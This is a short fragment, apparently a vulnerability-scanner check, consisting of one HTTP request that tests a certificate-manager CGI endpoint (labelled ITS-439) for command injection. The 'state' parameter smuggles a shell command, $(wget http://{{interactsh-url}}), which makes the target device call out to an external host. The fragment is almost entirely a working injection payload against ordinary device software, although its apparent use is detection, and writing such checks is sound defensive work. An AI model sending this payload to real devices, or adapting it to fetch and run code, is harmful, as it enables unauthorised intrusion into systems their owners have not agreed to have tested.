# Vulnerable: ITS-439
GET //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://{{interactsh-url}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
